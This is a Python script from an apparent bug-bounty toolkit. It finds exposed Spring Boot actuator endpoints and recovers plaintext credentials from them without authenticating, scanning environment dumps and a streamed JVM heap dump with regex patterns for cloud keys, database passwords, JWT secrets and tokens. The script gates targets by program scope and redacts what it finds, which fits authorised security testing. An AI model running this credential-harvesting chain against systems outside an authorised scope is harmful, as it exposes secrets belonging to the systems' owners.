#!/usr/bin/env python3
"""
recon_actuator_chain.py — chain an exposed actuator to ACTUAL recovered credentials.

The existing lane mints "/actuator responds" (3 findings, 0 real verdicts, ever). That is
the discovery half of a Critical and it is worth nothing on its own — every scanner finds
it, so it is a duplicate the day it is reported.

The finding is not "the actuator is exposed". The finding is "the actuator is exposed AND
here is the database password / AWS key / JWT signing secret I recovered from it, without
authenticating". Same host, same exposure, different report, different payout. A documented
case went `/actuator/heapdump` -> `strings` -> plaintext AWS keys -> an S3 bucket holding
terabytes of tracking data, with no 0-day involved.

This lane does the chain:
    /actuator            enumerate the real endpoint index (never guess blindly)
    /actuator/env        resolved Environment — DB passwords, API keys, JWT secrets
    /actuator/configprops
    /actuator/heapdump   full JVM heap — live credentials and session tokens
    /actuator/gateway/routes   route table (SSRF pivot surface)
    /actuator/mappings   undocumented internal routes

It mints ONLY when credential material is actually recovered. Actuator present but properly
masked (`******`) is recorded as a negative, not a finding — that is the correct state and
reporting it is what gets a report closed as informational.

SAFETY
  * GET only. Read-only actuator endpoints only. NEVER /shutdown, /restart, /loggers (POST),
    /env POST (property override), /jolokia, or anything that mutates or executes.
  * Recovered secrets are REDACTED in evidence — first 4 chars and length, never the value.
    We prove recovery is possible; we do not keep or use the credential. Confirm the
    exposure, never exploit past it.
  * Heap dumps are size-capped and stream-scanned; nothing is retained on disk.
  * scope+pays gate, vpn_down fail-closed, anti-burn pacing.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import ssl
import subprocess
import sys
import urllib.error
import urllib.parse
import urllib.request
from datetime import datetime, timezone

BASE_DIR = os.environ.get("BASE_DIR", os.path.expanduser("~/recon"))
STATE_DIR = os.environ.get("STATE_DIR", os.path.join(BASE_DIR, "state"))
REPO_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SCOPE_CHECK = os.path.join(REPO_DIR, "scripts", "recon_scope_check.sh")
AUDIT = os.path.join(STATE_DIR, "actuator_chain_audit.jsonl")
OUT_DIR = os.path.join(BASE_DIR, "actuator")

TIMEOUT = float(os.environ.get("ACT_TIMEOUT", "20"))
HEAP_CAP = int(os.environ.get("ACT_HEAP_CAP_MB", "120")) * 1024 * 1024
UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) "
      "Chrome/127.0.0.0 Safari/537.36")

# Read-only actuator endpoints worth chaining, in value order. Anything that mutates,
# executes, or restarts is deliberately absent and must stay absent.
CHAIN = [
    ("env", "resolved Environment (DB passwords, API keys, JWT secrets)"),
    ("configprops", "bound configuration properties"),
    ("gateway/routes", "Spring Cloud Gateway route table — SSRF pivot surface"),
    ("mappings", "undocumented internal route map"),
    ("beans", "wired beans — internal architecture"),
    ("scheduledtasks", "scheduled jobs"),
    ("httpexchanges", "recent HTTP exchanges — may contain live tokens"),
    ("threaddump", "thread dump"),
]

BASES = ["/actuator", "", "/manage", "/management", "/admin", "/actuator/admin"]

# Credential material worth proving. Each is (name, regex, how many chars to keep).
SECRET_PATTERNS: list[tuple[str, re.Pattern, int]] = [
    ("aws-access-key-id", re.compile(rb"\b((?:AKIA|ASIA|AGPA|AIDA|AROA|ANPA)[A-Z0-9]{16})\b"), 8),
    ("aws-secret-key", re.compile(rb"(?i)aws.{0,20}secret.{0,20}[\"':=\s]([A-Za-z0-9/+=]{40})\b"), 4),
    ("private-key", re.compile(rb"-----BEGIN (?:RSA |EC |OPENSSH |PGP )?PRIVATE KEY-----"), 0),
    ("jdbc-with-password", re.compile(rb"(jdbc:[a-z0-9]+://[^\s\"']{4,80}[?&;](?:password|pwd)=[^\s\"'&]{3,})"), 24),
    ("db-password-prop", re.compile(rb"(?i)(?:spring\.datasource\.password|db[._-]?password|database[._-]?password)[\"']?\s*[:=]\s*[\"']?([^\s\"',}]{4,64})"), 4),
    ("jwt-signing-secret", re.compile(rb"(?i)(?:jwt[._-]?secret|signing[._-]?key|token[._-]?secret)[\"']?\s*[:=]\s*[\"']?([^\s\"',}]{8,80})"), 4),
    ("slack-token", re.compile(rb"\b(xox[baprs]-[A-Za-z0-9-]{10,})\b"), 10),
    ("github-pat", re.compile(rb"\b(gh[pousr]_[A-Za-z0-9]{36,})\b"), 8),
    ("google-api-key", re.compile(rb"\b(AIza[0-9A-Za-z_\-]{35})\b"), 8),
    ("stripe-secret", re.compile(rb"\b(sk_live_[0-9a-zA-Z]{20,})\b"), 8),
    ("bearer-token", re.compile(rb"(?i)authorization[\"':\s]+bearer\s+([A-Za-z0-9._\-]{20,})"), 6),
    ("smtp-url", re.compile(rb"(smtps?://[^\s\"':]{2,40}:[^\s\"'@]{3,}@[^\s\"'/]{4,})"), 12),
    ("mongo-url", re.compile(rb"(mongodb(?:\+srv)?://[^\s\"':]{2,40}:[^\s\"'@]{3,}@[^\s\"'/]{4,})"), 16),
    ("redis-url", re.compile(rb"(redis://[^\s\"':]*:[^\s\"'@]{3,}@[^\s\"'/]{4,})"), 12),
]

# A masked value is the CORRECT state — Spring masks sensitive props by default.
MASKED = re.compile(rb"^[\*\xe2\x80\xa2]{3,}$|^\*+$")

# Spring Boot 4.0.0-4.0.5 = CVE-2026-40976, unauthenticated actuator authorization bypass.
VULN_SPRING = re.compile(r"^4\.0\.[0-5]$")


def utc() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def log(m: str) -> None:
    print(f"[actuator] {m}", file=sys.stderr, flush=True)


def audit(rec: dict) -> None:
    os.makedirs(STATE_DIR, exist_ok=True)
    rec.setdefault("at", utc())
    with open(AUDIT, "a", encoding="utf-8") as f:
        f.write(json.dumps(rec) + "\n")


def redact(name: str, raw: bytes, keep: int) -> str:
    """Prove a credential was recovered without keeping it. Never returns the value."""
    s = raw.decode("utf-8", "replace")
    if keep <= 0:
        return f"<{name}: present, {len(s)} chars>"
    return f"{s[:keep]}{'*' * max(4, min(12, len(s) - keep))} (len={len(s)})"


def vpn_down() -> bool:
    return os.path.exists(os.path.join(STATE_DIR, "vpn_down"))


def scope_ok(host: str) -> tuple[bool, str]:
    if not os.path.exists(SCOPE_CHECK):
        return False, "scope resolver missing (fail-closed)"
    try:
        d = json.loads(subprocess.run(["bash", SCOPE_CHECK, host], capture_output=True,
                                      text=True, timeout=45).stdout)
    except Exception as e:
        return False, f"scope check failed: {e}"
    if not d.get("in_scope"):
        return False, "not in scope"
    if not d.get("pays"):
        return False, "does not pay for this asset"
    if d.get("out_of_scope"):
        return False, "explicitly out of scope"
    return True, d.get("program") or ""


def _opener():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))


def get(url: str, cap: int = 4_000_000) -> dict:
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", UA)
    req.add_header("Accept", "*/*")
    try:
        with _opener().open(req, timeout=TIMEOUT) as r:
            return {"ok": True, "status": r.status, "body": r.read(cap),
                    "ctype": (r.headers.get("Content-Type") or "").split(";")[0].strip(),
                    "clen": int(r.headers.get("Content-Length") or 0)}
    except urllib.error.HTTPError as e:
        return {"ok": True, "status": e.code, "body": b"", "ctype": "", "clen": 0}
    except Exception as e:
        return {"ok": False, "status": 0, "body": b"", "ctype": "", "clen": 0,
                "error": str(e)[:160]}


def scan_secrets(blob: bytes, source: str) -> list[dict]:
    """Find recoverable credential material. A masked value is not a finding."""
    out: list[dict] = []
    seen: set[str] = set()
    for name, rx, keep in SECRET_PATTERNS:
        for m in rx.finditer(blob):
            raw = m.group(1) if m.groups() else m.group(0)
            if MASKED.match(raw.strip()):
                continue
            if len(set(raw)) <= 2:          # '****', 'aaaa' — placeholder, not a secret
                continue
            k = f"{name}:{raw[:24]!r}"
            if k in seen:
                continue
            seen.add(k)
            out.append({"kind": name, "source": source,
                        "redacted": redact(name, raw, keep)})
            if len(out) >= 40:
                return out
    return out


def stream_scan_heap(url: str) -> tuple[list[dict], int]:
    """Stream the heap dump through the secret scanner without holding it or writing it
    to disk. Overlapping window so a credential spanning a chunk boundary is not missed."""
    req = urllib.request.Request(url, method="GET")
    req.add_header("User-Agent", UA)
    found: list[dict] = []
    total = 0
    try:
        with _opener().open(req, timeout=TIMEOUT * 3) as r:
            if r.status != 200:
                return [], 0
            tail = b""
            while total < HEAP_CAP:
                chunk = r.read(2 * 1024 * 1024)
                if not chunk:
                    break
                total += len(chunk)
                hits = scan_secrets(tail + chunk, "heapdump")
                for h in hits:
                    if h["redacted"] not in [f["redacted"] for f in found]:
                        found.append(h)
                if len(found) >= 25:
                    break
                tail = chunk[-4096:]
    except Exception as e:
        log(f"    heapdump stream ended: {str(e)[:100]}")
    return found, total


def reachable(host: str) -> bool:
    """One cheap check before spending six full timeouts on a host that is not answering.
    Without this, 43 hosts x 6 base paths x 20s is over an hour of mostly waiting."""
    import socket
    try:
        ip = socket.getaddrinfo(host, 443, socket.AF_INET, socket.SOCK_STREAM)[0][4][0]
    except Exception:
        return False
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)
    try:
        return s.connect_ex((ip, 443)) == 0
    except Exception:
        return False
    finally:
        s.close()


def find_base(host: str) -> tuple[str | None, dict]:
    """Enumerate the real actuator index rather than guessing endpoint names — the index
    tells us exactly what is exposed on THIS build."""
    if not reachable(host):
        return None, {}
    for b in BASES:
        url = f"https://{host}{b}"
        r = get(url)
        if r["status"] != 200 or not r["body"]:
            continue
        try:
            j = json.loads(r["body"])
        except Exception:
            continue
        if isinstance(j, dict) and ("_links" in j or "links" in j):
            links = j.get("_links") or j.get("links") or {}
            return f"https://{host}{b}", links
    return None, {}


def run_host(host: str, dry: bool) -> dict:
    ok, program = scope_ok(host)
    if not ok:
        log(f"SKIP {host}: {program}")
        return {"host": host, "skipped": program}

    base, links = find_base(host)
    if not base:
        log(f"{host}: no actuator index found")
        # Record the negative too. Coverage only means something if the misses are written
        # down — otherwise "we found nothing" is indistinguishable from "we never looked".
        audit({"host": host, "program": program, "actuator": False,
               "checked": BASES, "result": "no actuator index"})
        return {"host": host, "actuator": False}

    exposed = sorted(k for k in links if k not in ("self",))
    log(f"{host}: actuator at {base} — {len(exposed)} endpoints exposed")
    log(f"  index: {', '.join(exposed[:18])}{' …' if len(exposed) > 18 else ''}")

    secrets: list[dict] = []
    reached: list[str] = []
    notes: list[str] = []

    # Version check — CVE-2026-40976 is an unauthenticated authorization bypass on 4.0.0-4.0.5
    ri = get(f"{base}/info")
    if ri["status"] == 200 and ri["body"]:
        m = re.search(rb'"(?:spring-boot|springBoot|version)"\s*:\s*"([0-9][^"]{0,20})"', ri["body"])
        if m:
            v = m.group(1).decode()
            notes.append(f"reported version {v}")
            if VULN_SPRING.match(v):
                notes.append(f"**version {v} is in range for CVE-2026-40976** "
                             f"(unauthenticated actuator authorization bypass, CVSS 9.1)")

    for ep, why in CHAIN:
        if ep not in exposed and ep.split("/")[0] not in exposed:
            continue
        url = f"{base}/{ep}"
        r = get(url)
        if r["status"] != 200 or not r["body"]:
            continue
        reached.append(ep)
        hits = scan_secrets(r["body"], ep)
        if hits:
            log(f"  [{ep}] {len(hits)} credential(s) recovered — {why}")
            secrets.extend(hits)
        else:
            log(f"  [{ep}] reachable, no plaintext credentials (masked or absent)")

    if "heapdump" in exposed:
        log("  [heapdump] streaming JVM heap through the credential scanner…")
        hits, n = stream_scan_heap(f"{base}/heapdump")
        log(f"  [heapdump] scanned {n / 1048576:.1f} MB — {len(hits)} credential(s) recovered")
        secrets.extend(hits)
        if hits:
            notes.append(f"heap dump downloadable unauthenticated ({n / 1048576:.1f} MB scanned)")

    kinds = sorted({s["kind"] for s in secrets})
    res = {"host": host, "program": program, "actuator": True, "base": base,
           "exposed": exposed, "reached": reached, "secrets": secrets,
           "kinds": kinds, "notes": notes}
    audit({k: v for k, v in res.items() if k != "secrets"} | {"n_secrets": len(secrets)})

    if secrets and not dry:
        res["finding_id"] = mint(res)
    elif not secrets:
        log(f"{host}: actuator exposed but no credential material recovered — "
            f"NOT a finding on its own (this is the correct, masked state)")
    return res


def mint(res: dict) -> int | None:
    try:
        sys.path.insert(0, REPO_DIR)
        from engine import state
    except Exception as e:
        log(f"could not persist ({e})")
        return None
    ev = {
        "chain": "unauthenticated actuator -> credential recovery",
        "base": res["base"],
        "endpoints_exposed": res["exposed"],
        "endpoints_reached": res["reached"],
        "credential_kinds": res["kinds"],
        "credentials_redacted": res["secrets"][:25],
        "notes": res["notes"],
        "method": "GET only, read-only actuator endpoints; secrets redacted and not used",
        "at": utc(),
    }
    conn = state.connect()
    state.init_db(conn)
    fid = state.record_confirmed(
        conn, res["host"], url=res["base"], program=res["program"] or None,
        signal_class="actuator-chain", vuln_class="unauth-credential-disclosure",
        score=18, evidence=ev, confidence=0.95)
    conn.close()
    log(f"  minted finding #{fid} — {len(res['secrets'])} credential(s): {', '.join(res['kinds'])}")
    return fid


def main() -> int:
    ap = argparse.ArgumentParser(
        description="Chain an exposed Spring Boot actuator to actually-recovered credentials.")
    ap.add_argument("host", nargs="+")
    ap.add_argument("--dry-run", action="store_true")
    a = ap.parse_args()
    if vpn_down():
        log("vpn_down — refusing target traffic (fail-closed)")
        return 2

    runs = [run_host(h, a.dry_run) for h in a.host]
    os.makedirs(OUT_DIR, exist_ok=True)
    out = os.path.join(OUT_DIR, f"actuator_{datetime.now().strftime('%Y-%m-%d')}.md")
    L = [f"# Actuator credential chain — {utc()}", ""]
    for r in runs:
        if r.get("skipped"):
            L += [f"## {r['host']} — SKIPPED ({r['skipped']})", ""]
            continue
        if not r.get("actuator"):
            L += [f"## {r['host']} — no actuator index", ""]
            continue
        L += [f"## {r['host']} ({r.get('program','')})",
              f"- base: `{r['base']}`",
              f"- exposed: {', '.join(f'`{e}`' for e in r['exposed'])}",
              f"- reached: {', '.join(f'`{e}`' for e in r['reached']) or 'none'}"]
        for n in r.get("notes", []):
            L.append(f"- {n}")
        if r.get("secrets"):
            L += ["", f"### {len(r['secrets'])} credential(s) recovered unauthenticated", ""]
            for s in r["secrets"]:
                L.append(f"- **{s['kind']}** via `{s['source']}` — `{s['redacted']}`")
        else:
            L += ["", "_No credential material recovered — properly masked. Not a finding._"]
        L.append("")
    open(out, "w", encoding="utf-8").write("\n".join(L))
    log(f"report → {out}")
    print(json.dumps([{k: v for k, v in r.items() if k != "secrets"} for r in runs],
                     default=str)[:1500])
    return 0


if __name__ == "__main__":
    sys.exit(main())
